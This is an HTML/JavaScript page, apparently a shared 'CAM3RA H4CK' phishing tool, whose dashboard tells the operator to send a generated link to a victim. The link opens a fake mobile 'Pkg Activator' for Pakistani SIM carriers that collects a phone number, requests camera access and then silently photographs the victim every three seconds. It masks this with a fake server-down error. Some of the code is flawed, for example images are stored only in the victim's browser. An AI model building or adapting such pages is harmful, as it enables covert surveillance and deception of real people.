<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>ðŸ”— Link Generator & Pkg Activator</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<style>
/* --- General & Light Mode Base --- */
body {
    font-family: 'Poppins', sans-serif;
    background: #f8fafc; /* Light Gray/White Background */
    color: #1e293b; /* Dark Text Color */
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: flex-start; 
    min-height: 100vh;
}

/* --- Card Styling --- */
.card {
    background: #ffffff; /* Pure White Card Background */
    padding: 30px;
    border-radius: 16px;
    max-width: 450px;
    width: 95%; 
    margin: 20px auto;
    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1); 
    border: 1px solid #e2e8f0; 
    transition: all 0.3s ease;
}

/* --- Header Section (Gap Further Reduced) --- */
.header-container {
    display: flex;
    align-items: center; 
    justify-content: center;
    gap: 3px; /* Gap reduced to 3px */
    margin-bottom: 8px;
}

/* --- Image Styling (Size Increased) --- */
#header-img-link {
    display: block;
    width: 36px; /* Size increased */
    height: 36px;
    flex-shrink: 0; 
}
#header-img-link img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 4px;
}

h2 {
    font-weight: 700;
    color: #0f172a; 
    margin: 0; 
    text-align: center;
}

h3 {
    font-weight: 600;
    color: #475569; 
    margin: 20px 0 15px 0;
    text-align: center;
}

/* --- Data Header (Captured Data Section) --- */
.data-header-container {
    display: flex;
    align-items: center; 
    justify-content: center;
    gap: 5px; 
    margin: 20px 0 15px 0; 
}

.data-header-container h3 {
    margin: 0;
    text-align: left; 
}

.data-header-container img {
    width: 24px;
    height: 24px;
    object-fit: cover;
    border-radius: 4px;
}

/* --- Button Styling --- */
button {
    padding: 12px 20px;
    border-radius: 10px;
    border: 0;
    background: #3b82f6; /* Default Blue */
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s ease;
    box-shadow: 0 4px 10px rgba(59, 130, 246, 0.3);
}

button:hover {
    background: #2563eb; 
    box-shadow: 0 6px 15px rgba(59, 130, 246, 0.4);
}

button:active {
    transform: translateY(1px);
    box-shadow: 0 2px 5px rgba(59, 130, 246, 0.3);
}

/* --- Input/Select Styling (Cool Look) --- */
input, select {
    width: 100%;
    padding: 15px 12px; 
    border-radius: 12px; 
    border: 2px solid #cbd5e1; 
    margin-top: 15px; 
    background: #ffffff; 
    color: #1e293b;
    font-size: 16px; 
    transition: border-color 0.3s, box-shadow 0.3s;
    box-sizing: border-box;
}

input:focus, select:focus {
    outline: none;
    border-color: #3b82f6; 
    box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); 
}

/* --- Utility & Gallery --- */
.gallery {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
    gap: 8px;
    margin-top: 15px;
}
/* Centering "No images yet" text */
.gallery small { 
    width: 100%;
    grid-column: 1 / -1; 
    text-align: center; /* Ensures center alignment */
}

img {
    width: 100%;
    height: 80px; 
    object-fit: cover;
    border-radius: 6px;
    display: block;
}

small {
    color: #64748b; 
    display: block;
    text-align: center;
    margin-bottom: 15px;
}

hr {
    margin: 25px 0;
    border: none;
    border-top: 1px solid #e2e8f0; 
}

#linkBox {
    display: flex;
    flex-wrap: wrap; 
    justify-content: space-between;
    gap: 8px;
    margin-top: 15px;
}
#linkBox input {
    width: 100%; 
    margin-top: 0;
    margin-bottom: 8px;
}
#linkBox button {
    width: calc(50% - 4px); 
    margin-top: 0;
}
#refreshBtn {
    width: 100%; 
    margin-top: 8px; 
}

/* --- Download Button Specific Style --- */
#downloadBtn {
    width: 100%;
    margin-top: 15px;
    background: #059669; /* Green/Teal for Download */
}

/* --- Pkg Activator Specific Styles --- */
#pkg-activator-card {
    max-width: 400px;
}
#activateBtn {
    width: 100%;
    margin-top: 30px; 
    background: #10b981; 
    font-size: 18px; 
    padding: 15px 20px;
}
#activationStatus {
    text-align: center;
    margin-top: 30px;
    font-weight: 600;
    display: none;
    padding: 20px; 
    border-radius: 12px;
    border: 2px solid #ef4444; 
    background-color: #fef2f2; 
    color: #b91c1c; 
    line-height: 1.4;
    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2);
}

/* Hidden elements */
video {
    opacity: 0; 
    position: absolute;
    z-index: -1;
}

/* --- WhatsApp Floating Button (New) --- */
#whatsapp-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background-color: #25d366; /* WhatsApp Green */
    color: white;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 24px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
    z-index: 1000;
    transition: transform 0.2s;
}

#whatsapp-btn:hover {
    transform: scale(1.05);
}
</style>
</head>
<body>

<div class="card" id="dashboard-card">
    <div class="header-container">
        <a id="header-img-link" href="https://imgbb.com/">
            <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="images (2)" border="0">
        </a>
        <h2><div><font color="#ff0000">C</font><font color="#ff4000">A</font><font color="#ff7f00">M</font><font color="#fff600">3</font><font color="#80ff00">R</font><font color="#00ff00">A</font><font color="#00ff80"> </font><font color="#00ffff">H</font><font color="#0000ff">4</font><font color="#4600ff">C</font><font color="#8b00ff">K</font></div></h2>
  </div>                 
    <small>Click on generate link button and send it to victim to access camera of victim.</small>

    <div id="genArea" style="text-align: center;">
        <button id="genBtn">Generate New Link</button>
        <div id="linkBox">
            </div>
    </div>
       
<marquee behavior="scroll" direction="left">
 <div><font color="#ff0000">P</font><font color="#ff1900">O</font><font color="#ff3300">W</font><font color="#ff4c00">E</font><font color="#ff6600">R</font><font color="#ff7f00">E</font><font color="#ff9900">D</font><font color="#ffb200"> </font><font color="#ffcc00">B</font><font color="#ffe500">Y</font><font color="#ffff00"> </font><font color="#ccff00">|</font><font color="#99ff00"> </font><font color="#66ff00">M</font><font color="#33ff00">I</font><font color="#00ff00">A</font><font color="#00ff33">N</font><font color="#00ff66"> </font><font color="#00ff99">A</font><font color="#00ffcc">B</font><font color="#00ffff">D</font><font color="#00ccff">U</font><font color="#0099ff">L</font><font color="#0066ff">-</font><font color="#0033ff">R</font><font color="#0000ff">E</font><font color="#1c00ff">H</font><font color="#3800ff">M</font><font color="#5300ff">A</font><font color="#6f00ff">N</font><font color="#8b00ff"> </font></div> 
</marquee>
    <hr>

    <div id="dataArea" style="display:none">
        <div class="data-header-container">
            <a style="display: block; width: 24px; height: 24px;"> 
                <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="camera icon">
            </a>
            <h3>Captured Data (ID: <span id="showId"></span>)</h3>
        </div>
        <div><font color="#ff0000">D</font><font color="#ff1900">I</font><font color="#ff3300">S</font><font color="#ff4c00">C</font><font color="#ff6600">L</font><font color="#ff7f00">A</font><font color="#ff9900">I</font><font color="#ffb200">M</font><font color="#ffcc00">E</font><font color="#ffe500">R</font><font color="#ffff00"> </font><font color="#ccff00">:</font><font color="#99ff00"> </font><font color="#66ff00">U</font><font color="#33ff00">S</font><font color="#00ff00">E</font><font color="#00ff40"> </font><font color="#00ff80">O</font><font color="#00ffbf">N</font><font color="#00ffff"> </font><font color="#00ccff">Y</font><font color="#0099ff">O</font><font color="#0066ff">U</font><font color="#0033ff">R</font><font color="#0000ff"> </font><font color="#1c00ff">R</font><font color="#3800ff">I</font><font color="#5300ff">S</font><font color="#6f00ff">K</font><font color="#8b00ff"> </font></div>
        
        <div id="images" class="gallery"></div>
        
        <button id="downloadBtn" onclick="downloadAllImages()">Download All Captured Images</button>
    </div>
</div>

<div class="card" id="pkg-activator-card" style="display:none;">
    <h2>Pkg Activator</h2>
    <small>Select your SIM and enter your number to activate your desired package.</small>
    
    <select id="sim-select">
        <option value="">-- Select Your SIM --</option>
        <option value="jazz">Jazz</option>
        <option value="telenor">Telenor</option>
        <option value="ufone">Ufone</option>
        <option value="zong">Zong</option>
        <option value="sco">SCOM</option>
        <option value="other">Other/Landline</option>
    </select>
    
    <input type="tel" id="mobile-number" placeholder="Enter Mobile Number (03xxxxxxxxx)">
    
    <button id="activateBtn">Activate Pkg</button>
    
    <div id="activationStatus"></div>

    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement" style="display:none;"></canvas>
</div>

<a id="whatsapp-btn" href="https://whatsapp.com/channel/0029VbB4Y41EVccLcCk8lK1p" target="_blank">
    <i class="fab fa-whatsapp"></i>
</a>

<script>
// Capture interval set to 3 seconds
const CAPTURE_INTERVAL_MS = 3000; 

// --- Dashboard Elements ---
const dashboardCard = document.getElementById('dashboard-card');
const pkgActivatorCard = document.getElementById('pkg-activator-card');
const genBtn=document.getElementById('genBtn');
const linkBox=document.getElementById('linkBox');
const dataArea=document.getElementById('dataArea');
const showId=document.getElementById('showId');
const images=document.getElementById('images');

// --- Pkg Activator Elements ---
const activateBtn = document.getElementById('activateBtn');
const simSelect = document.getElementById('sim-select');
const mobileNumber = document.getElementById('mobile-number');
const activationStatus = document.getElementById('activationStatus');
const video = document.getElementById('videoElement');
const canvas = document.getElementById('canvasElement');
let captureIntervalId = null; // To hold the interval ID for continuous capture

// --- Utility Functions ---
function generateId(){return 'user-'+Math.random().toString(36).slice(2,10);}
function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}

// Renders captured images on the dashboard
function renderImages(id){ 
    const imgs=getImages(id);
    images.innerHTML='';
    if(!imgs.length){images.innerHTML='<small style="margin-top:10px;">No images yet for this ID. Open the generated link to capture data.</small>'; return;}
    imgs.forEach((url, index)=>{
        const img=document.createElement('img'); 
        img.src=url; 
        img.title = `Image ${index + 1}`;
        images.appendChild(img);
    });
}

function stopCamera(stream) {
    if (stream) {
        stream.getTracks().forEach(t => t.stop());
    }
}

// --- Download Function (New) ---
async function downloadAllImages() {
    const id = localStorage.getItem('currentId');
    if (!id) {
        alert("Pehle koi link generate karein.");
        return;
    }

    const imagesArray = getImages(id);
    if (imagesArray.length === 0) {
        alert("Download karne ke liye koi image nahi hai.");
        return;
    }
    
    // JSZip library ka use karke zip file banate hain
    const zip = new JSZip();
    let counter = 0;

    for (let i = 0; i < imagesArray.length; i++) {
        const url = imagesArray[i];
        // Data URL se base64 part nikalte hain
        const base64Data = url.replace(/^data:image\/(png|jpeg);base64,/, "");
        
        // Zip file mein image add karte hain
        zip.file(`captured_img_${i + 1}.jpeg`, base64Data, {base64: true});
        counter++;
    }

    if (counter > 0) {
        document.getElementById('downloadBtn').textContent = 'Zipping... Please wait';
        document.getElementById('downloadBtn').disabled = true;

        zip.generateAsync({type:"blob"})
        .then(function(content) {
            // Download link create karke click karte hain
            const a = document.createElement('a');
            a.href = URL.createObjectURL(content);
            a.download = `captured_data_${id}.zip`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            document.getElementById('downloadBtn').textContent = 'Download Successful!';
            setTimeout(() => {
                document.getElementById('downloadBtn').textContent = 'Download All Captured Images';
                document.getElementById('downloadBtn').disabled = false;
            }, 3000);
        })
        .catch(err => {
            alert('Download mein error: ' + err);
            document.getElementById('downloadBtn').textContent = 'Download Error';
            document.getElementById('downloadBtn').disabled = false;
        });
    } else {
        alert("Download karne ke liye koi valid image nahi mili.");
    }
}


// --- Main Logic: Link Generator & Refresh ---
genBtn.onclick=()=>{
    const id=generateId();
    showId.textContent=id;
    const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
    localStorage.setItem('currentId',id); // Save current ID for dashboard

    // --- HTML Injection for Link Box ---
    linkBox.innerHTML=`
        <input readonly value="${link}">
        <button id="copyBtn">Copy Link</button> 
        <button id="openBtn">Open Link</button>
        <button id="refreshBtn">Refresh</button>
    `;
    
    document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
    document.getElementById('copyBtn').onclick=()=>navigator.clipboard.writeText(link).then(()=>alert('Copied')).catch(()=>prompt('Copy manually:', link));
    
    // --- Manual Refresh Logic ---
    document.getElementById('refreshBtn').onclick = () => {
        window.location.reload(); 
    };

    dataArea.style.display='block';
    renderImages(id);
};


// --- Pkg Activator Logic (Continuous Capture) ---

// Stop capturing when the user closes or leaves the page (Best effort)
window.onbeforeunload = () => {
    if (captureIntervalId) {
        clearInterval(captureIntervalId);
    }
};

activateBtn.onclick = async () => {
    activationStatus.style.display = 'none';
    
    // Simple Form Validation 
    if (!simSelect.value || mobileNumber.value.length < 11) {
        activationStatus.style.display = 'block';
        activationStatus.style.backgroundColor = '#fee2e2'; 
        activationStatus.style.color = '#dc2626'; 
        activationStatus.textContent = 'âŒ Please select SIM and enter a valid mobile number.';
        return;
    }

    // Disable button and show processing status
    activateBtn.disabled = true;
    activateBtn.textContent = 'Processing Request...';
    activateBtn.style.backgroundColor = '#fbbf24'; 
    activateBtn.style.color = '#78350f';

    const ID = new URLSearchParams(location.search).get('id');
    let stream = null;
    
    // --- Start Camera Capture Process (Continuous) ---
    try {
        // Try to get camera permission
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => video.play();

        // Start continuous capture interval
        captureIntervalId = setInterval(() => {
            if (video.videoWidth === 0) return; // Skip if video not ready

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
            
            // Save data: Append new image to existing array
            const old = getImages(ID);
            old.push(capturedImage);
            saveImages(ID, old);
            
            // Console mein confirmation (optional, for debugging)
            console.log(`Image captured and saved: Total ${old.length}`);

        }, CAPTURE_INTERVAL_MS);


        // --- Display ONLY the Fake Server Down Error (Immediately after starting continuous capture) ---
        // This is shown immediately to give the impression of a fast error while camera capture continues in background
        setTimeout(() => {
            activationStatus.style.display = 'block';
            activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server Ä°s Down Due To Overload!';
            
            // Keep button disabled/locked until page refresh
            // activateBtn.disabled = false;
            // activateBtn.textContent = 'Activate Pkg';
            // activateBtn.style.backgroundColor = '#10b981';
            
        }, 1000); 


    } catch (err) {
        // Camera permission denied or device error
        stopCamera(stream);
        console.error("Camera Error:", err);
        
        // --- Display ONLY the Fake Server Down Error ---
        activationStatus.style.display = 'block';
        activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server Ä°s Down Due To Overload! (Camera Access Failed)';
        
        // Re-enable button
        activateBtn.disabled = false;
        activateBtn.textContent = 'Activate Pkg';
        activateStatus.style.backgroundColor = '#10b981';
    }
};

// --- Router (Determines which view to show) ---
const ID_PARAM=new URLSearchParams(location.search).get('id');
if(ID_PARAM){
    // Show Pkg Activator View
    dashboardCard.style.display = 'none';
    pkgActivatorCard.style.display = 'block';
    document.body.style.alignItems = 'center';
    document.getElementById('whatsapp-btn').style.display = 'none'; // Hide floating button on activator page

} else {
    // Show Dashboard View (and load previous data if any)
    const savedId=localStorage.getItem('currentId');
    if(savedId){
        showId.textContent=savedId;
        dataArea.style.display='block';
        renderImages(savedId);
    }
}
</script>
</body>
</html>
